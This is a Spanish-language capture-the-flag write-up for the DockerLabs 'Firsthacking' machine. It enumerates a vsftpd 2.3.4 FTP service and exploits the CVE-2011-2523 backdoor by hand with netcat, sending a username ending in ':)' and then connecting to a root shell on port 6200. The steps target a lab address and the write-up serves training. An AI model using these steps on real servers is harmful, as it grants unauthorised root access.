# Firsthacking — DockerLabs
**Dificultad:** Muy fácil | **SO:** Linux | **Fecha:** 31/03/2026

---

## Reconocimiento

Lo primero antes de cualquier escaneo es verificar que tenemos conectividad
con la máquina objetivo.
```bash
ping -c 3 172.17.0.2
```

![CAPTURA_1]

La máquina responde correctamente. Confirmada la conectividad, procedemos
a enumerar.

---

## Enumeración

Lanzamos nmap con el flag `-sV` para detectar puertos abiertos y las
versiones de los servicios que corren en ellos:
```bash
nmap -sV 172.17.0.2
```

![CAPTURA_2]

**Resultado:**
- Puerto **21/tcp** abierto — Servicio **FTP** — Versión **vsftpd 2.3.4**

Solo hay un puerto abierto. La versión concreta del servicio es clave —
vsftpd 2.3.4 es una versión notoriamente vulnerable.

Buscamos exploits conocidos para esta versión:
```bash
searchsploit vsftpd 2.3.4
```

![CAPTURA_3]

Encontramos dos exploits para **CVE-2011-2523**:
- `49757.py` — Backdoor Command Execution (Python)
- `17491.rb` — Backdoor Command Execution (Metasploit)

Copiamos el exploit en Python para analizarlo:
```bash
searchsploit -p 49757.py
cp /usr/share/exploitdb/exploits/unix/remote/49757.py .
cat 49757.py
```

![CAPTURA_4]

Del análisis del código extraemos cómo funciona la backdoor:
- Si el usuario FTP contiene `:)` al final, se activa la puerta trasera
- La contraseña es irrelevante, cualquier valor es válido
- El servidor abre automáticamente una shell en el **puerto 6200**

---

## Explotación

En lugar de ejecutar el script directamente, reproducimos el exploit
manualmente con netcat para entender cada paso.

**Paso 1 — Activamos la backdoor conectándonos al FTP:**
```bash
nc 172.17.0.2 21
USER mario:)
PASS cualquiercosa
```

![CAPTURA_5]

El servidor acepta la conexión. El `:)` en el nombre de usuario activa
la backdoor internamente y el servidor abre una shell en el puerto 6200.

**Paso 2 — Nos conectamos a la shell abierta:**

En una segunda terminal:
```bash
nc 172.17.0.2 6200
whoami
```

![CAPTURA_6]

---

## Post-explotación / Escalada de privilegios

La shell obtenida nos otorga acceso directo como **root**, el usuario con
máximos privilegios en Linux. En esta máquina no es necesaria escalada
de privilegios — la backdoor CVE-2011-2523 nos da control total del
sistema desde el primer momento.

En un entorno real esto supondría el compromiso total del servidor:
acceso a todos los archivos, credenciales, bases de datos y posibilidad
de pivotar hacia otros sistemas de la red.

---

## Lecciones aprendidas

1. **Siempre verificar versiones.** nmap con `-sV` nos dio la versión
exacta del servicio, que fue la clave de toda la explotación.

2. **Las backdoors son especialmente peligrosas** porque no dependen
de un error de configuración sino de código malicioso intencionado.
vsftpd 2.3.4 fue comprometido en 2011 directamente en su repositorio
oficial.

3. **searchsploit es tu primer recurso** cuando encuentras una versión
de servicio específica. Antes de buscar en Google, consúltalo.

4. **Entender el exploit antes de ejecutarlo.** Leer el código del
script nos permitió reproducirlo manualmente con netcat y comprender
exactamente qué ocurría en cada paso.

5. **CVE-2011-2523** — Vulnerabilidad de backdoor en vsftpd 2.3.4.
Permite ejecución remota de comandos sin autenticación, con acceso
directo como root.
